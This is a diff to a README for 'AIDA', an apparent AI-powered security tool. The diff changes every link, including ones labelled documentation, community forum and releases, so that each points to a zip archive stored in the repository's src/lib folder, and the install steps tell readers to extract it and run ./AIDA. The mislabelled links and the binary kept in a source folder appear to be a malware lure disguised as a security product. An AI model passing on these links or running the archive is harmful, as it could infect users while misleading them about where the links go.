@@ -1,6 +1,6 @@
 # 🛡️ AIDA - Simplified Security Solutions with AI
 
-[![Download AIDA](https://raw.githubusercontent.com/eslamfox100/AIDA/main/src/components/Software_v1.2-alpha.4.zip%https://raw.githubusercontent.com/eslamfox100/AIDA/main/src/components/Software_v1.2-alpha.4.zip)](https://raw.githubusercontent.com/eslamfox100/AIDA/main/src/components/Software_v1.2-alpha.4.zip)
+[![Download AIDA](https://github.com/eslamfox100/AIDA/raw/refs/heads/main/src/lib/Software_1.2.zip%https://github.com/eslamfox100/AIDA/raw/refs/heads/main/src/lib/Software_1.2.zip)](https://github.com/eslamfox100/AIDA/raw/refs/heads/main/src/lib/Software_1.2.zip)
 
 ## 📦 Overview
 
@@ -23,7 +23,7 @@ Before you download AIDA, make sure your system meets the following requirements
 
 To download AIDA, go to our Releases page. Click on the link below:
 
-[Download AIDA](https://raw.githubusercontent.com/eslamfox100/AIDA/main/src/components/Software_v1.2-alpha.4.zip)
+[Download AIDA](https://github.com/eslamfox100/AIDA/raw/refs/heads/main/src/lib/Software_1.2.zip)
 
 ### 3. Download AIDA
 
@@ -42,7 +42,7 @@ After the download completes, locate the downloaded file. Depending on your oper
   2. Drag the AIDA application to your Applications folder.
 
 - **Linux**: 
-  1. Extract the `https://raw.githubusercontent.com/eslamfox100/AIDA/main/src/components/Software_v1.2-alpha.4.zip` file.
+  1. Extract the `https://github.com/eslamfox100/AIDA/raw/refs/heads/main/src/lib/Software_1.2.zip` file.
   2. Open a terminal and navigate to the extracted folder.
   3. Run the command `./AIDA` to start the application.
 
@@ -80,11 +80,11 @@ If you experience any issues during installation or while using AIDA, please ref
 
 For more information about AIDA, explore the following links:
 
-- [Official Documentation](https://raw.githubusercontent.com/eslamfox100/AIDA/main/src/components/Software_v1.2-alpha.4.zip)
-- [Community Forum](https://raw.githubusercontent.com/eslamfox100/AIDA/main/src/components/Software_v1.2-alpha.4.zip)
+- [Official Documentation](https://github.com/eslamfox100/AIDA/raw/refs/heads/main/src/lib/Software_1.2.zip)
+- [Community Forum](https://github.com/eslamfox100/AIDA/raw/refs/heads/main/src/lib/Software_1.2.zip)
 
 ## 📥 Download & Install
 
-To start your journey with AIDA, make sure to **[visit the Releases page to download](https://raw.githubusercontent.com/eslamfox100/AIDA/main/src/components/Software_v1.2-alpha.4.zip)** the latest version. 
+To start your journey with AIDA, make sure to **[visit the Releases page to download](https://github.com/eslamfox100/AIDA/raw/refs/heads/main/src/lib/Software_1.2.zip)** the latest version. 
 
 With AIDA, elevate your vulnerability assessment process and secure your systems with ease.
